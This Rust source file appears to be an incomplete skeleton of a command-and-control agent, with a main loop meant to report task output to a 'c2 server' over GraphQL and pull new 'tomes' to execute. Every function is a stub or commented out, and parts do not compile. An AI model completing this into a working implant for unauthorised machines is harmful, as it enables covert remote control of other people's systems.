use super::graphql;
use tokio::task;


enum TaskStatus {
    Waiting,
    Running,
    Finished,
}

struct TaskData {
    tome: String,
}

struct Task {
    task_id: u32,
    start_time: String,
    status: TaskStatus,
    future_handle: task,
    data: TaskData,
}

async fn execute_tome(tome_path: String) {

}

async fn graphql_send_response() -> graphql::GraphQLResponse {
    unimplemented!("graphql will callback to the c2 server. Update the ")
}

async fn graphql_request_update() -> graphql::GraphQLResponse {
    unimplemented!("graphql will callback to the c2 server. Update the ")
}

async fn pull_tome() {
    unimplemented!("graphql will callback to the c2 server. Update the ")
}

pub async fn main_loop() {
    let mut cur_task_id: u32 = 0;
    let active_tasks: Vec<Task> = vec![];
    loop {
        cur_task_id = (1+cur_task_id) % u32::MAX;
        let finished_task_res: Vec<String> = vec![];
        // Check if tasks have finished and collect results.
        for task in &active_tasks {
            // check if future is done and update the status.
            match task.status {
                TaskStatus::Finished => {
                    todo!();
                },
                _ => todo!(),
            }
        }

        // Send task output back to the server.
        // let resp = graphql_send_response(finished_task_res);

        // Get new tasks from the server.
        // let new_tasks = graphql_request_update();

        // let new_tasks = get_new_tasks();
        // for task in new_tasks {
        //     active_tasks.append()
        // }
    }
}